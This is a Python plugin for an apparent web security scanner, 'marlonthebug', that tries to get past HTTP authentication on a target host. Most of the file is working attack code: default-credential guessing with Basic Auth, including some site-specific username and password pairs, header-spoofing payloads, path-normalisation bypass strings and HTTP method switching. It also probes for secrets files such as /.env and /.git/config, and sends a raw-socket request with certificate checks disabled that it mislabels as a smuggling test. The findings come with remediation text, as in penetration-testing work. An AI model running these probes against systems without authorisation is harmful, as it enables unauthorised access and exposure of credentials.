"""Authentication bypass — HTTP Basic Auth, header manipulation, method switching, and Nginx tricks."""

from __future__ import annotations

import asyncio
import base64
import logging
from typing import TYPE_CHECKING, AsyncIterator

from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Finding, Severity

if TYPE_CHECKING:
    from marlonthebug.core.workspace import Workspace, TargetInfo

logger = logging.getLogger("marlonthebug.plugins.recon.auth_bypass")

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("user", "user"),
    ("user", "password"),
    ("root", "root"),
    ("root", "password"),
    ("guest", "guest"),
    ("test", "test"),
    ("crm", "crm"),
    ("crmnou", "crmnou"),
    ("innova", "innova"),
    ("innova", "ges"),
    ("ges", "ges"),
]

HEADER_BYPASS_PAYLOADS = [
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Proto": "https"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "localhost"},
    {"Forwarded": "for=127.0.0.1"},
    {"Via": "127.0.0.1"},
]

PATH_BYPASSES = [
    "/admin/",
    "/admin?",
    "/admin%2f",
    "/admin%3b",
    "/admin%00",
    "//admin",
    "/./admin",
    "/;/admin",
    "/admin;.js",
    "/admin.json",
    "/admin..;/",
    "/admin%20",
    "/admin%09",
    "/admin%0a",
    "/admin;",
    "///admin",
    "/admin/..;/",
]

METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE", "TRACE"]

PUBLIC_PATHS = [
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/",
    "/.well-known/security.txt",
    "/humans.txt",
    "/assets/",
    "/static/",
    "/public/",
    "/css/",
    "/js/",
    "/images/",
    "/img/",
    "/fonts/",
    "/index.htm",
    "/index.html",
    "/readme.md",
    "/CHANGELOG.md",
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/api/health",
    "/api/status",
    "/health",
    "/healthz",
    "/ping",
    "/status",
    "/version",
    "/build.txt",
    "/release.txt",
]


class AuthBypassPlugin(BasePlugin):
    name = "auth_bypass"
    version = "1.0.0"
    description = "Test HTTP authentication bypass techniques: default credentials, header manipulation, method switching, path tricks, and public resource access"
    category = "recon"

    async def setup(self, workspace: Workspace) -> None:
        self._workspace = workspace

    async def run(self, target: TargetInfo, options: dict | None = None) -> AsyncIterator[Finding]:
        http = AsyncHTTPClient(timeout=8, retries=1)
        try:
            for scheme in ["https", "http"]:
                try:
                    resp = await http.get(f"{scheme}://{target.host}")
                    base_url = f"{scheme}://{target.host}"
                    break
                except Exception:
                    continue
            else:
                return

            is_auth = resp.status_code == 401
            www_auth = resp.headers.get("www-authenticate", "")

            if not is_auth:
                return

            yield Finding(
                plugin_name=self.name,
                title="HTTP Authentication detected",
                description=f"Site requires authentication: {www_auth}. Testing bypass techniques.",
                severity=Severity.INFO,
                cvss_score=0.0,
                endpoint=base_url,
                target_host=target.host,
                category=self.category,
                evidence={"auth_type": www_auth, "status": resp.status_code},
            )

            async for finding in self._test_default_credentials(http, base_url, target.host):
                yield finding

            async for finding in self._test_header_bypass(http, base_url, target.host):
                yield finding

            async for finding in self._test_method_bypass(http, base_url, target.host):
                yield finding

            async for finding in self._test_public_paths(http, base_url, target.host):
                yield finding

            async for finding in self._test_specific_endpoints(http, base_url, target.host):
                yield finding

            async for finding in self._test_request_smuggling_auth_bypass(http, base_url, target.host, scheme):
                yield finding

        finally:
            await http.close()

    async def _test_default_credentials(
        self, http: AsyncHTTPClient, base_url: str, host: str
    ) -> AsyncIterator[Finding]:
        results: list[dict] = []
        for username, password in DEFAULT_CREDENTIALS:
            auth = base64.b64encode(f"{username}:{password}".encode()).decode()
            try:
                resp = await http.get(base_url, headers={"Authorization": f"Basic {auth}"})
                if resp.status_code not in (401, 403):
                    results.append({"username": username, "password": password, "status": resp.status_code})
                    yield Finding(
                        plugin_name=self.name,
                        title=f"Default credentials WORK: {username}:{password}",
                        description=f"Successfully authenticated with {username}:{password} (HTTP {resp.status_code}).",
                        severity=Severity.CRITICAL,
                        cvss_score=10.0,
                        endpoint=base_url,
                        target_host=host,
                        category=self.category,
                        evidence={"username": username, "password": password, "status": resp.status_code},
                        remediation="Change default credentials immediately. Implement strong password policies and MFA.",
                    )
                    break
            except Exception:
                pass

    async def _test_header_bypass(
        self, http: AsyncHTTPClient, base_url: str, host: str
    ) -> AsyncIterator[Finding]:
        for headers in HEADER_BYPASS_PAYLOADS:
            try:
                resp = await http.get(base_url, headers=headers)
                if resp.status_code == 200:
                    yield Finding(
                        plugin_name=self.name,
                        title=f"Auth bypass via header: {list(headers.keys())[0]}",
                        description=f"Authentication bypassed using header '{list(headers.keys())[0]}': {list(headers.values())[0]}.",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        endpoint=base_url,
                        target_host=host,
                        category=self.category,
                        evidence={"header": headers, "status": resp.status_code, "body_preview": resp.body[:200]},
                        remediation=(
                            "1. Do not trust request headers for authorization decisions\n"
                            "2. Validate authentication on every request server-side\n"
                            "3. Ignore X-Forwarded-* headers unless behind a trusted proxy\n"
                            "4. Configure nginx to strip untrusted X-* headers"
                        ),
                    )
                    break
            except Exception:
                pass

    async def _test_method_bypass(
        self, http: AsyncHTTPClient, base_url: str, host: str
    ) -> AsyncIterator[Finding]:
        for method in METHODS:
            try:
                if method == "GET":
                    resp = await http.get(base_url)
                elif method == "POST":
                    resp = await http.post(base_url)
                elif method == "HEAD":
                    resp = await http.head(base_url)
                elif method == "OPTIONS":
                    resp = await http.options(base_url)
                elif method == "PUT":
                    resp = await http.put(base_url)
                elif method == "PATCH":
                    resp = await http.patch(base_url)
                elif method == "DELETE":
                    resp = await http.delete(base_url)
                else:
                    continue

                if resp.status_code not in (401, 403, 404):
                    yield Finding(
                        plugin_name=self.name,
                        title=f"Auth bypass via HTTP method: {method}",
                        description=f"Authentication bypassed using HTTP {method} instead of GET.",
                        severity=Severity.CRITICAL,
                        cvss_score=9.0,
                        endpoint=base_url,
                        target_host=host,
                        category=self.category,
                        evidence={"method": method, "status": resp.status_code, "body_preview": resp.body[:200]},
                        remediation="Ensure all HTTP methods are protected by authentication.",
                    )
                    break
            except Exception:
                pass

    async def _test_public_paths(
        self, http: AsyncHTTPClient, base_url: str, host: str
    ) -> AsyncIterator[Finding]:
        found_public = []
        for path in PUBLIC_PATHS:
            try:
                url = f"{base_url}{path}"
                resp = await http.head(url)
                if resp.status_code == 200:
                    found_public.append({"path": path, "status": resp.status_code})
                elif resp.status_code not in (401, 404):
                    found_public.append({"path": path, "status": resp.status_code})
            except Exception:
                pass

        if found_public:
            for item in found_public[:10]:
                yield Finding(
                    plugin_name=self.name,
                    title=f"Publicly accessible path: {item['path']} ({item['status']})",
                    description=f"Path {item['path']} is accessible without authentication.",
                    severity=Severity.LOW,
                    cvss_score=2.0,
                    endpoint=f"{base_url}{item['path']}",
                    target_host=host,
                    category=self.category,
                    evidence=item,
                )

    async def _test_specific_endpoints(
        self, http: AsyncHTTPClient, base_url: str, host: str
    ) -> AsyncIterator[Finding]:
        sensitive = [
            "/api/", "/graphql", "/swagger", "/docs",
            "/.git/HEAD", "/.env", "/.git/config",
            "/wp-json/", "/wp-json/wp/v2/users",
            "/admin", "/login", "/dashboard",
            "/phpinfo.php", "/info.php", "/server-status",
            "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
            "/metrics", "/prometheus",
        ]

        async def probe(path: str) -> tuple[str, int, str]:
            url = f"{base_url}{path}"
            try:
                r = await http.head(url)
                return (path, r.status_code, r.headers.get("content-type", ""))
            except Exception:
                return (path, 0, "")

        results = await asyncio.gather(*(probe(p) for p in sensitive))
        for path, status, ct in results:
            if status not in (401, 404, 400, 0):
                yield Finding(
                    plugin_name=self.name,
                    title=f"Sensitive endpoint without auth: {path} ({status})",
                    description=f"Endpoint {path} returned HTTP {status} without requiring authentication.",
                    severity=Severity.HIGH if status == 200 else Severity.MEDIUM,
                    cvss_score=7.5 if status == 200 else 5.0,
                    endpoint=f"{base_url}{path}",
                    target_host=host,
                    category=self.category,
                    evidence={"path": path, "status": status, "content_type": ct},
                )

    async def _test_request_smuggling_auth_bypass(
        self, http: AsyncHTTPClient, base_url: str, host: str, scheme: str
    ) -> AsyncIterator[Finding]:
        import socket
        import time
        from urllib.parse import urlparse

        parsed = urlparse(base_url)
        port = parsed.port or (443 if scheme == "https" else 80)

        try:
            raw_payload = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            if scheme == "https":
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(raw_payload)
            start = time.monotonic()
            response = b""
            sock.settimeout(3)
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            elapsed = time.monotonic() - start
            sock.close()

            header_str = response.split(b"\r\n\r\n")[0].decode("utf-8", errors="replace")
            if "200" in header_str.split("\r\n")[0]:
                yield Finding(
                    plugin_name=self.name,
                    title="Auth bypass via raw socket request (potential smuggling)",
                    description="Direct raw socket request returned HTTP 200, bypassing application-level auth.",
                    severity=Severity.CRITICAL,
                    cvss_score=9.8,
                    endpoint=base_url,
                    target_host=host,
                    category=self.category,
                    evidence={"response_header": header_str, "elapsed": elapsed},
                )
        except Exception as e:
            logger.debug("Raw socket test failed: %s", e)
